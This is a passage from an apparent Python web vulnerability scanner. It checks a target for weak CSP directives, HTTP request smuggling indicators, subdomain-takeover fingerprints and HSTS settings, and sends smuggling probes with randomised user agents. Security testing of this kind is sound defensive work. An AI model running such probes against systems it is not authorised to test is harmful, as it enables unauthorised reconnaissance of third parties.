                "mitre_name": "JavaScript",
                "reproducibility": f"curl -I {self.target} | grep -i 'content-security'",
            })
        else:
            csp_issues = [
                (r"script-src[^;]*'unsafe-inline'", "unsafe-inline in script-src bypasses XSS protection", "HIGH"),
                (r"script-src[^;]*'unsafe-eval'",   "unsafe-eval allows eval() — code injection via XSS", "HIGH"),
                (r"default-src[^;]*'unsafe-inline'","unsafe-inline in default-src — CSP effectively disabled", "HIGH"),
                (r"script-src[^;]*\*['\s;]",        "Wildcard * in script-src — any CDN can load scripts", "CRITICAL"),
                (r"frame-ancestors\s+\*",            "frame-ancestors * — clickjacking protection disabled", "HIGH"),
            ]
            for pattern, detail, severity in csp_issues:
                if re.search(pattern, csp, re.I):
                    self._add({
                        "type": "CSP_WEAK_DIRECTIVE",
                        "severity": severity,
                        "confidence": 93,
                        "confidence_label": "Confirmed",
                        "url": self.target,
                        "csp_value": csp[:200],
                        "proof": f"CSP header present but contains weak directive: {detail}",
                        "detail": f"Weak CSP: {detail}",
                        "remediation": "Remove unsafe-inline/unsafe-eval. Use nonces or hashes. Use strict CSP.",
                        "mitre_technique": "T1059.007",
                        "mitre_name": "JavaScript",
                        "reproducibility": f"curl -I {self.target} | grep 'Content-Security-Policy'",
                    })

    # ── HTTP Request Smuggling indicators ─────────────────────────────────────

    async def test_request_smuggling(self, sess):
        print("\n[*] Testing HTTP request smuggling indicators...")
        url = self.target + "/"
        for probe in SMUGGLE_PROBES:
            try:
                async with self._sem:
                    async with sess.request(
                        probe["method"], url,
                        headers={**probe["headers"], "User-Agent": random_ua()},
                        data=probe["body"].encode(),
                        ssl=False,
                        timeout=aiohttp.ClientTimeout(total=10),
                        allow_redirects=False,
                    ) as r:
                        body = await r.text(errors="ignore")
                        status = r.status
                        resp_hdrs = dict(r.headers)
            except Exception:
                continue
            await delay(0.1)
            # Smuggling indicators: timeout, 400/408/500 with error body, or duplicate response
            smuggle_indicators = [
                status in (400, 408, 500) and "invalid" in (body or "").lower(),
                status == 200 and "GET" in (body or ""),  # reflected method
                "Bad Request" in (body or "") and probe["label"] in ("CL.TE", "TE.CL"),
            ]
            if any(smuggle_indicators):
                self._add({
                    "type": f"HTTP_SMUGGLING_INDICATOR_{probe['label'].replace('.', '_')}",
                    "severity": "HIGH",
                    "confidence": 72,
                    "confidence_label": "Medium",
                    "url": url,
                    "smuggling_variant": probe["label"],
                    "proof": f"POST {url}\n  {probe['label']} probe → HTTP {status}\n  Body: {(body or '')[:200]}",
                    "detail": f"HTTP request smuggling indicator ({probe['label']}). Ambiguous CL/TE handling detected.",
                    "remediation": (
                        "1. Use HTTP/2 end-to-end where possible (eliminates CL/TE ambiguity). "
                        "2. Reject requests with both Content-Length and Transfer-Encoding. "
                        "3. Normalize requests at reverse proxy/CDN layer. "
                        "4. Ensure consistent TE handling between frontend proxy and backend."
                    ),
                    "mitre_technique": "T1190",
                    "mitre_name": "Exploit Public-Facing Application",
                    "reproducibility": f"# Use HTTP/1.1 CL.TE/TE.CL smuggling probe against {url}",
                })

    # ── Subdomain Takeover indicators ──────────────────────────────────────────

    async def test_subdomain_takeover(self, sess):
        print("\n[*] Checking for subdomain takeover fingerprints...")
        s, body, hdrs = await self._get(sess, self.target, allow_redirects=True)
        if not body:
            return
        for service, fingerprints in TAKEOVER_FINGERPRINTS.items():
            for fp in fingerprints:
                if fp.lower() in body.lower():
                    self._add({
                        "type": "SUBDOMAIN_TAKEOVER_FINGERPRINT",
                        "severity": "HIGH",
                        "confidence": 78,
                        "confidence_label": "High",
                        "url": self.target,
                        "service": service,
                        "fingerprint": fp,
                        "proof": f"Subdomain takeover fingerprint for {service}: '{fp}' found in response body",
                        "detail": f"Possible subdomain takeover — {service} error fingerprint detected. Domain may point to unclaimed {service} resource.",
                        "remediation": (
                            f"1. Claim the resource on {service} or remove the DNS CNAME entry. "
                            "2. Audit all DNS CNAMEs pointing to external services. "
                            "3. Implement DNS monitoring to detect dangling CNAMEs."
                        ),
                        "mitre_technique": "T1584",
                        "mitre_name": "Compromise Infrastructure",
                        "reproducibility": f"curl -s {self.target} | grep -i '{fp[:30]}'",
                    })

    # ── HSTS Check ────────────────────────────────────────────────────────────

    async def test_hsts(self, sess):
        print("\n[*] Checking HSTS configuration...")
        s, body, hdrs = await self._get(sess, self.target, allow_redirects=False)
        if s is None:
            return
        hsts = hdrs.get("Strict-Transport-Security",
                        hdrs.get("strict-transport-security", ""))
        if not hsts:
            self._add({
                "type": "HSTS_MISSING",
                "severity": "HIGH",
                "confidence": 95,
                "confidence_label": "Confirmed",
                "url": self.target,
                "proof": "No Strict-Transport-Security header in HTTP response",
                "detail": "Missing HSTS — browser allows HTTP downgrade, enables SSL stripping/MITM",
                "remediation": "Add: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
                "mitre_technique": "T1557",
                "mitre_name": "Adversary-in-the-Middle",
                "reproducibility": f"curl -I {self.target} | grep -i 'strict-transport'",
            })
        else:
            m = re.search(r'max-age=(\d+)', hsts, re.I)
            if m and int(m.group(1)) < 31536000:
                self._add({
                    "type": "HSTS_MAX_AGE_TOO_SHORT",
                    "severity": "LOW",
                    "confidence": 90,
                    "confidence_label": "Confirmed",
                    "url": self.target,
                    "hsts_value": hsts,
                    "proof": f"HSTS max-age={m.group(1)} — less than 1 year (31536000s)",
                    "detail": "HSTS max-age too short — browsers forget HTTPS-only policy quickly",
                    "remediation": "Set max-age to at least 31536000 (1 year). Add includeSubDomains and preload.",
                    "mitre_technique": "T1557",
                    "mitre_name": "Adversary-in-the-Middle",
                    "reproducibility": f"curl -I {self.target} | grep -i 'strict-transport'",
                })

    # ── Main ─────────────────────────────────────────────────────────────────

    async def run(self):
        print("=" * 60)
        print("  WebProbe v8 — 150x Improved Web Vulnerability Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)
        conn = aiohttp.TCPConnector(limit=CONCURRENCY * 2, ssl=False)
        timeout = aiohttp.ClientTimeout(total=120, connect=10)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
            await asyncio.gather(
                self.test_xss(sess),
                self.test_xss_post(sess),
                self.test_dom_sinks(sess),
                self.test_prototype_pollution(sess),
                self.test_open_redirect(sess),
                self.test_cors(sess),
                self.test_clickjacking(sess),
                self.test_cache_poisoning(sess),
                self.test_sri(sess),
                self.test_security_headers(sess),
                self.test_request_smuggling(sess),
                self.test_subdomain_takeover(sess),
                self.test_hsts(sess),
                return_exceptions=True,
            )
        print(f"\n[+] WebProbe v8 complete: {len(self.findings)} findings")
        return self.findings


def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        p = Path("reports/_target.txt")
        target = p.read_text().strip() if p.exists() else input("[?] Target URL: ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(WebProbe(target).run())
    with open("reports/webprobe.json", "w") as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings → reports/webprobe.json")


if __name__ == "__main__":
    main()
